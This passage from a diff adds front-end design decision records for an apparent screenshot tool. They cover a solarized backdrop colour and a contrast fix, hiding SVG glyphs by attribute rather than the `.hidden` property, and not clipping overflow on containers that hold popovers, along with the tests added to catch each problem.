+history is a different act entirely from rewriting history nobody has ever seen.
+
+## D36: The capture is laid on a solarized mat, not on the page background
+
+**Date.** 2026-09-09.
+
+**Context.** The result tab painted its background with `--sunken`, which is
+`#fafafa` in light and `#101012` in dark. A screenshot of an ordinary web page is
+white or near-white at its edges, so in light mode the capture had no visible edge
+at all: the reader could not see where their image stopped and the tab began. In
+dark mode the opposite happened, a white slab on near-black, which is correct but
+harsh.
+
+**Decision.** A dedicated `--mat` token for the surface the capture sits on, and
+nothing else. Solarized base3 `#fdf6e3` in light, base03 `#002b36` in dark. The
+canvas edge is drawn with `--mat-edge` rather than `--line`, because the interface
+line colour is a neutral grey that vanishes into a warm background.
+
+**Why solarized rather than a grey.** Its two backgrounds are a designed pair,
+built to hold the same relationship to their foregrounds in either direction. One
+token swap gives a mat that works in both themes, instead of two greys guessed
+separately and each checked on its own. The warmth also does the actual job: it is
+different enough from any screenshot's own white to draw the boundary, without
+being a colour that competes with the image.
+
+**Consequences.** `--muted` had to be darkened from `#71717a` to `#6b6b73`. Against
+`#fdf6e3` the old grey measured 4.48:1, which misses 4.5:1, and three labels sit
+directly on the mat. The rendered-page audit caught it, which is what it is for.
+The change was applied to the settings page too, so the two pages do not drift
+apart over a colour neither of them needs to differ on.
+
+**What it deliberately does not touch.** The toolbar, which keeps `--surface`, so
+it still reads as browser chrome above the mat rather than as part of the image.
+
+## D37: `hidden` is not a property of SVGElement
+
+**Date.** 2026-09-09. Written as a decision rather than a fix note because it is a
+trap that had already been walked into three times in the same file.
+
+**Context.** `element.hidden = true` is the ordinary way to show and hide things in
+this codebase, and it works, because `hidden` is defined on `HTMLElement`.
+`SVGElement` does not inherit from `HTMLElement` and has no such property. Assigning
+to it therefore sets a plain JavaScript property on the object, leaves the content
+attribute untouched, and changes nothing that is painted.
+
+Three places did exactly that. The theme button carries three glyphs and shows one;
+it showed the monitor icon and kept showing it through the whole cycle, while the
+tooltip and the aria-label updated correctly, so the button said one thing and drew
+another. The Fill button carries a slash it is meant to lift once a fill is chosen,
+and it never lifted. Both were reported by the maintainer, not by the suite.
+
+**Why the suite missed it.** The end-to-end check read `element.hidden` to decide
+which glyph was showing: the same property the code was writing. Code and test
+agreed with each other and neither of them agreed with the browser. That is the
+exact failure D23 exists to prevent, arriving through a door D23 had not been
+pointed at.
+
+**Decision.** Three parts.
+
+1. One helper, `showGlyph(node, on)`, sets and removes the attribute. Nothing in
+   `src/ui/` assigns `.hidden` on an SVG element or on a shape inside one.
+2. CSS says what `hidden` means for SVG, because the user agent stylesheet does
+   not: `#toolbar svg[hidden], #toolbar svg [hidden] { display: none; }`.
+3. The check reads computed `display`, never the property the code writes.
+
+**Consequences.** HTML elements keep using `.hidden`, which is correct and
+idiomatic for them. The rule is about the boundary, not about the idiom.
+
+## D38: A container that holds a popover may not hide its overflow
+
+**Date.** 2026-09-09.
+
+**Context.** The Shapes and Text groups are split buttons, and D34's presentation
+work moved their border from the two halves onto the group so they stopped being
+the only controls in the row wearing a box around their chevron. Making two square
+buttons sit inside one rounded border was done with `overflow: hidden`, which is
+the obvious way to do it.
+
+Those groups also contain their own popover. `overflow: hidden` clipped it. Both
+menus were laid out at the right size, in the right place, and painted nowhere:
+present in the DOM, correct in every property either the code or the tests read,
+and invisible on screen. Neither chevron did anything.
+
+**Why every check passed.** The tests that use those two menus reach into them by
+id, `#pop-shapes [data-tool="rect"]`, because that is the reliable way to pick a
+specific item. Nothing ever opened them the way a person does and then asked
+whether anything was there.
+
+**Decision.** The corners are rounded on each half instead of clipped on the group,
+so the group's overflow stays visible. And a new check opens every chevron in the
+toolbar, then hit tests the centre of the menu it claims to have opened with
+`document.elementFromPoint`. If what is painted there is not the menu, the menu is
+not there.
+
+**The general rule.** A popover is positioned outside its container by definition.
+Any container that holds one has to let its overflow show, so `overflow: hidden` on
+an ancestor of a `.pop` is a bug even when it looks like styling. Clip the children
+instead, or move the popover out.
+
